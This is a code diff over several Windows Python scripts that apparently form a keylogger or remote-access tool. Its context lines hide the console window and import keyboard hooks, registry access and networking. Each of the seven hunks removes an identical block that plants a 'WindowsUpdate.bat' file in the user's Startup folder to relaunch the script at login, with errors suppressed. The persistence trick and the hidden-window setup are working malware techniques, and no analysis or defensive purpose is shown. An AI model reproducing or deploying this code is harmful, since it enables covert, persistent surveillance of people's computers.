@@ -167,15 +167,6 @@ import platform
 import socket
 from requests import get
 import shutil
-import getpass
-
-try:
-    USER_NAME = getpass.getuser()
-    bat_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % USER_NAME
-    with open(bat_path + '\\' + "WindowsUpdate.bat", "w+") as bat_file:
-        bat_file.write(r'start "" %s' % __file__)
-except:
-    pass
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
@@ -275,15 +266,6 @@ from pynput.keyboard import Key
 import winreg as reg
 import os
 import ctypes
-import getpass
-
-try:
-    USER_NAME = getpass.getuser()
-    bat_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % USER_NAME
-    with open(bat_path + '\\' + "WindowsUpdate.bat", "w+") as bat_file:
-        bat_file.write(r'start "" %s' % __file__)
-except:
-    pass
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
@@ -357,15 +339,6 @@ import ctypes
 import platform
 import socket
 from requests import get
-import getpass
-
-try:
-    USER_NAME = getpass.getuser()
-    bat_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % USER_NAME
-    with open(bat_path + '\\' + "WindowsUpdate.bat", "w+") as bat_file:
-        bat_file.write(r'start "" %s' % __file__)
-except:
-    pass
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
@@ -493,15 +466,6 @@ import platform
 import socket
 from requests import get
 import shutil
-import getpass
-
-try:
-    USER_NAME = getpass.getuser()
-    bat_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % USER_NAME
-    with open(bat_path + '\\' + "WindowsUpdate.bat", "w+") as bat_file:
-        bat_file.write(r'start "" %s' % __file__)
-except:
-    pass
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
@@ -645,15 +609,6 @@ import threading
 import winreg as reg
 import ctypes
 from requests import get
-import getpass
-
-try:
-    USER_NAME = getpass.getuser()
-    bat_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % USER_NAME
-    with open(bat_path + '\\' + "WindowsUpdate.bat", "w+") as bat_file:
-        bat_file.write(r'start "" %s' % __file__)
-except:
-    pass
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
@@ -720,15 +675,6 @@ import winreg as reg
 from multiprocessing import Process
 import ctypes
 from datetime import datetime
-import getpass
-
-try:
-    USER_NAME = getpass.getuser()
-    bat_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % USER_NAME
-    with open(bat_path + '\\' + "WindowsUpdate.bat", "w+") as bat_file:
-        bat_file.write(r'start "" %s' % __file__)
-except:
-    pass
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
@@ -837,15 +783,6 @@ import threading
 import winreg as reg
 import ctypes
 from requests import get
-import getpass
-
-try:
-    USER_NAME = getpass.getuser()
-    bat_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % USER_NAME
-    with open(bat_path + '\\' + "WindowsUpdate.bat", "w+") as bat_file:
-        bat_file.write(r'start "" %s' % __file__)
-except:
-    pass
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
